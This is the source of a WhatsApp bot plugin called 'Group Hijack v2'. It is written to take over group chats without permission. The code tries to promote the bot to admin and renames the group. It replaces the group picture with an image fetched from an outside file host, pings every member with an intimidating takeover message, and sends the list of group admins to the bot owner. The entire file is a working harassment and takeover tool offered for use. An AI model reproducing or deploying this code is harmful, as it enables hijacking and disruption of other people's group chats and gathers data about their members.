/**
 * Group Hijack v2 (Universal Edition)
 * Author: OmegaTech
 * Version: 2.7 (No-Permission Required)
 */

import axios from 'axios';

let handler = async (m, { conn, participants, isBotAdmin }) => {
    // NO ADMIN CHECK - ANYONE CAN TRIGGER
    await m.reply('`[ LADY-TRISH UNIVERSAL BREAK-IN STARTING... ]` 🔓');

    try {
        const botJid = conn.user.jid;

        // 1. THE EXPLOIT ATTEMPT
        // Even if it fails, it sends the request to the server to try and "pop" admin
        try {
            await conn.groupParticipantsUpdate(m.chat, [botJid], 'promote');
            await m.reply('⚡ *System Status:* Attempting Admin Override...');
        } catch (e) {
            // Silently continue if blocked
        }

        // 2. NAME & PP CHANGE (Works if group is set to "All Participants")
        const newName = 'ʜɪᴊᴀᴄᴋᴇᴅ ʙʏ ʟᴀᴅʏ-ᴛʀɪsʜ 🔥';
        const ppUrl = 'https://files.catbox.moe/3b6dsq.png';

        let nameSuccess = false;
        try {
            await conn.groupUpdateSubject(m.chat, newName);
            nameSuccess = true;
        } catch (e) {}

        try {
            const response = await axios.get(ppUrl, { responseType: 'arraybuffer' });
            await conn.updateProfilePicture(m.chat, response.data);
        } catch (e) {}

        // 3. THE TAG-ALL NUKE (The Core Hijack)
        // This forces everyone's phone to ping, asserting the takeover
        let mentions = participants.map(p => p.id);
        let nukeText = `
*🔥 ɢʀᴏᴜᴘ ᴍᴀʀᴋᴇᴅ ʙʏ ʟᴀᴅʏ-ᴛʀɪsʜ 🔥*
───────────────────────
ᴛʜɪs ᴄʜᴀᴛ ɪs ɴᴏᴡ ᴜɴᴅᴇʀ ᴛʜᴇ ɪɴғʟᴜᴇɴᴄᴇ ᴏғ ᴏᴍᴇɢᴀᴛᴇᴄʜ. 
${nameSuccess ? '✅ sʏsᴛᴇᴍ ᴄᴏɴᴛʀᴏʟ sᴇɪᴢᴇᴅ.' : '⚠️ ᴏᴘᴇʀᴀᴛɪɴɢ ɪɴ sʜᴀᴅᴏᴡ ᴍᴏᴅᴇ.'}

ʙᴏᴡ ᴅᴏᴡɴ ᴏʀ ʟᴇᴀᴠᴇ.
`.trim();

        await conn.sendMessage(m.chat, {
            text: nukeText,
            mentions: mentions
        }, { quoted: m });

        // 4. ADMIN INTEL EXFILTRATION
        // Sends the list of current admins to the Owner's DM
        let ownerJid = global.owner[0][0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        let adminList = participants.filter(p => p.admin).map(p => `• @${p.id.split('@')[0]}`).join('\n');
        await conn.reply(ownerJid, `📊 *HIJACK INTEL*\nGroup: ${this.getName(m.chat)}\n\n*Target Admins:*\n${adminList}`, null, { mentions: participants.filter(p => p.admin).map(p => p.id) });

    } catch (err) {
        console.error(err);
        m.reply(`❌ *Breaker Error:* ${err.message}`);
    }
};

handler.help = ['hijackv2'];
handler.tags = ['group'];
handler.command = /^(hijackv2|break|⚡)$/i;
handler.group = true;

export default handler;